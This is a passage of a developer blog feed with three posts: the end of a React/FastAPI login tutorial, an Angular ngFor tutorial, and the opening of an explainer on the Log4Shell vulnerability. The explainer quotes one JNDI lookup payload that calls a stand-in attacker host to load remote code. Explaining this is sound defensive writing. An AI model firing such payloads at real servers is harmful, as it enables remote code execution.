          &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;setToken&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nx"&gt;navigate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/profile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
          &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;})&lt;/span&gt;
        &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
          &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;error&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;minHeight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;800&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;marginTop&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;login&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginTop&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;fetchToken&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
          &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;you&lt;/span&gt; &lt;span class="nx"&gt;are&lt;/span&gt; &lt;span class="nx"&gt;logged&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/p&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
          &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginRight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Input&lt;/span&gt; &lt;span class="nx"&gt;Username&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/label&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;input&lt;/span&gt;
                &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
                &lt;span class="nx"&gt;onChange&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;setUsername&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;target&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
              &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;
              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginRight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Input&lt;/span&gt; &lt;span class="nx"&gt;Password&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/label&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;input&lt;/span&gt;
                &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
                &lt;span class="nx"&gt;onChange&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;setPassword&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;target&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
              &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;
              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;button&lt;/span&gt; &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;button&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="nx"&gt;onClick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;login&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="nx"&gt;Login&lt;/span&gt;
              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/button&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/form&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;          &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="p"&gt;)}&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We'll also make changes to our &lt;code&gt;profile.js&lt;/code&gt; so let's open it up and paste this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Profile&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;navigate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;signOut&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;localStorage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;removeItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;temitope&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;navigate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginTop&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;minHeight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;700&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Profile&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Hello&lt;/span&gt; &lt;span class="nx"&gt;there&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;welcome&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt; &lt;span class="nx"&gt;your&lt;/span&gt; &lt;span class="nx"&gt;profile&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/p&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;button&lt;/span&gt; &lt;span class="nx"&gt;onClick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;signOut&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;sign&lt;/span&gt; &lt;span class="nx"&gt;out&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/button&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We're done, let' test our app . Run the code:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;uvicorn main:app &lt;span class="nt"&gt;--reload&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jiX8kdCS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3bga185xeiqrih0bse69.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jiX8kdCS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3bga185xeiqrih0bse69.gif" alt="finish" width="880" height="265"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h3&gt;

&lt;p&gt;In tutorial, we looked at what FastApi is and also what React is. We also learned how to install FastApi as well as React using these ideas to build our login authenication. Here's a link to the repo on &lt;a href="https://github.com/oyedeletemitope/login-authentication-with-react-and-FastAPI"&gt;github&lt;/a&gt;. Happy coding!!!&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>python</category>
      <category>webdev</category>
      <category>react</category>
    </item>
    <item>
      <title>Understanding Built In Angular Directives - Part 5</title>
      <author>Anubhab Mukherjee</author>
      <pubDate>Fri, 24 Dec 2021 19:40:23 +0000</pubDate>
      <link>https://dev.to/anubhab5/understanding-built-in-angular-directives-part-5-gli</link>
      <guid>https://dev.to/anubhab5/understanding-built-in-angular-directives-part-5-gli</guid>
      <description>&lt;p&gt;&lt;strong&gt;T&lt;/strong&gt;oday we will cover another important structural directive provided by the Angular Team - &lt;code&gt;ngFor&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ngFor&lt;/code&gt;&lt;br&gt;
The ngFor directive is used to loop through an array of items in the template. The element where the directive is written becomes the parent which is repeated.&lt;/p&gt;

&lt;p&gt;Lets see that in practice-&lt;br&gt;
We need to update our &lt;em&gt;structural-directive-demo.component.ts&lt;/em&gt; file and add the below code -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;itemsToBuy = ['Pencil', 'Notebook', 'School bag', 'Eraser'];
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and in component template file add the below code -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;div *ngFor="let item of itemsToBuy"&amp;gt;
  {{ item }}
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now if you start the application and open localhost:4200 in the browser you would see the below output -&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--4yZ94l4K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lgn3bdgawv76ii3jint6.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--4yZ94l4K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lgn3bdgawv76ii3jint6.PNG" alt="Image description" width="351" height="194"&gt;&lt;/a&gt;&lt;br&gt;
Now lets understand the below code&lt;br&gt;
&lt;code&gt;*ngFor="let item of itemsToBuy"&lt;/code&gt; &lt;br&gt;
Here ngFor is a structural directive so the * is appended at the start followed by the equals &lt;code&gt;=&lt;/code&gt; operator.&lt;br&gt;
Here &lt;code&gt;itemsToBuy&lt;/code&gt; is the array we declared in the component TS file. We use the for-of syntax to loop through the array. Every item in the array is assigned to the variable &lt;code&gt;item&lt;/code&gt; which is then printed in between div tag by using the &lt;code&gt;{{item}}&lt;/code&gt;. The loop is auto incremented and moves to the next item until all the items are printed.&lt;br&gt;
In the above example &lt;code&gt;item&lt;/code&gt; variable holds a string value.&lt;br&gt;
Similarly the array can also be a &lt;u&gt;list of objects&lt;/u&gt;. &lt;br&gt;
In that case at every iteration item would hold an object.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;A word of Caution&lt;/strong&gt;&lt;br&gt;
You should not use two structural directives on the same element.&lt;/p&gt;

&lt;p&gt;For example ngIf and ngFor at the same div element is not allowed.&lt;/p&gt;

&lt;p&gt;That's all about &lt;code&gt;ngFor&lt;/code&gt;. Hope you enjoyed the post.&lt;br&gt;
Please like, comment and share&lt;br&gt;
The last structural directive is on your way. So stay tuned.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Cheers&lt;/strong&gt;!!!&lt;br&gt;
&lt;em&gt;Happy Coding&lt;/em&gt;&lt;/p&gt;

</description>
      <category>angular</category>
      <category>beginners</category>
      <category>webdev</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Apache Log4j : Return of the JNDI</title>
      <author>Shubham Sah</author>
      <pubDate>Fri, 24 Dec 2021 19:28:52 +0000</pubDate>
      <link>https://dev.to/shubhamsah/apache-log4j-return-of-the-jndi-292o</link>
      <guid>https://dev.to/shubhamsah/apache-log4j-return-of-the-jndi-292o</guid>
      <description>&lt;p&gt;It seems surreal seeing log4j, a logging utility in the news and all over the internet. How is it that a little over &lt;a href="https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html"&gt;35000&lt;/a&gt; java packages, amounting to 8% of the Maven Central Repository has been impacted due to the log4shell vulnerability. How is it that a vulnerability in a logging library could result in a &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"&gt;CVSS score&lt;/a&gt; of 10[the highest it can go is 10]. This classic java logging library hitting mainstream feels so odd. Two different worlds that shouldn't be meeting.&lt;/p&gt;

&lt;p&gt;In this blog, let's understand what is log4j and what exactly is this log4shell vulnerability and why it happened? &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--H8KmtozX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0hr3cazeqq8tatk0j8sr.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--H8KmtozX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0hr3cazeqq8tatk0j8sr.jpeg" alt="log4shell" width="700" height="760"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-log4j"&gt;
  &lt;/a&gt;
  &lt;strong&gt;What is log4j?&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://github.com/apache/logging-log4j2"&gt;Apache Log4j&lt;/a&gt; is one of the most utilized logging library in the Java ecosystem. If you ever worked within a Java application, you've probably seen log4j in action. Log4j along with the basic logging capabilities, it provides additional features like log levels, a mechanism to write to different files, log rolling patterns. Although logging in java is quite a hell, log4j has been doing its job pretty fine over the years. I wanted to introduce log4j and its basic features to understand the bigger picture. So here is a simple java example using log4j.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8MTfjpaD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/th7a4qsj0m1qpwmuvgov.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8MTfjpaD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/th7a4qsj0m1qpwmuvgov.png" alt="Log4j Example" width="880" height="584"&gt;&lt;/a&gt;&lt;br&gt;
In the above snippet, we are getting a logger instance &lt;code&gt;logger = LogManager.getLogger();&lt;/code&gt; and we are calling &lt;code&gt;logger.info("Hello World");&lt;/code&gt; to log a basic message. Besides this, log4j can be heavily configured. You can learn more on configuring log4j &lt;a href="https://logging.apache.org/log4j/2.x/manual/configuration.html"&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-log4j-vulnerability-aka-log4shell-"&gt;
  &lt;/a&gt;
  &lt;strong&gt;What is Log4j vulnerability aka Log4Shell? :&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;Log4j by default supported a logging capability called lookups. Lookups in log4j are a way to add a value to the log4j configuration. This means it can interpolate specific strings at the time of logging the message. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--2CpPDRSM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1a80i6ye8403f91n9d0l.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--2CpPDRSM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1a80i6ye8403f91n9d0l.png" alt="log4j.xml" width="880" height="384"&gt;&lt;/a&gt;&lt;br&gt;
For example the environment lookup &lt;code&gt;$${env:USER}&lt;/code&gt; allows us to add environment variables in the log message.&lt;br&gt;
One of the supported lookups in log4j is the JNDI Lookups which allows variables to be retrieved via JNDI which supports LDAP. To better understand how it can create a problem let's understand &lt;strong&gt;JNDI&lt;/strong&gt;&lt;br&gt;
JNDI as it stands for Java Naming and Directory Interface provides an API for applications to interact with remote objects which are registered with the RMI registry or directory services like LDAP. A java-based application can make use of JNDI and LDAP to retrieve a business object containing data it might need, a pretty cool feature. This LDAP server could be remote or local. As a result, if a string which would look like &lt;code&gt;${jndi:ldap://attackServer.com/Exploit}&lt;/code&gt; was to be ever logged, JNDI would make a remote request to the LDAP server 'attackServer.com', request the file Exploit from the webserver and execute the request, And BOOM you get a REMOTE CODE EXECUTION (RCE).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--akcOgH-A--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a2cm89yn2q6zu7bkhlyh.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--akcOgH-A--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a2cm89yn2q6zu7bkhlyh.png" alt="Log4j attack cycle" width="700" height="388"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Log4j is such a popular library that even if you aren't using it directly, you might depend upon another library which actually uses log4j for their logging purpose or that might depend on another library that might use log4j. At this point, considering the popularity of log4j there is a good chance that any decent sized java application might be using Log4j. According to a dev-sec company called &lt;a href="https://snyk.io/blog/log4j-vulnerability-software-supply-chain-security-log4shell/"&gt;Synk&lt;/a&gt; found that about 60% application they scanned uses log4j indirectly and not depending on it directly.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--zMZgZvwB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4mwe42s6gtnxzomhuwbs.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--zMZgZvwB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4mwe42s6gtnxzomhuwbs.png" alt="Synk Log4j scan" width="757" height="450"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-did-the-vulnerability-happen"&gt;
  &lt;/a&gt;
  &lt;strong&gt;How did the vulnerability happen?&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;Now that we have a basic understanding of how the vulnerability works, the bigger question is how did this happen? &lt;br&gt;
You would be surprised that this exploit was sitting like a duck ready to be exploited for more than 8 years and no one noticed it. Let us understand the timeline.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;a href="https://logging.apache.org/log4j/2.x/security.html"&gt;On 10th of December&lt;/a&gt;, Apache published an advisory for CVE 2021-44228 with an update for log4j. So unlike the internet's belief, it was not discovered in Minecraft. It was first reported by Chen Zhaojun from the Alibaba Cloud Security Team on 26th November 2021. The Apache log4j team was made aware of the bug on &lt;a href="https://github.com/apache/logging-log4j2/pull/608/commits"&gt;30th November 2021&lt;/a&gt;.&lt;/li&gt;
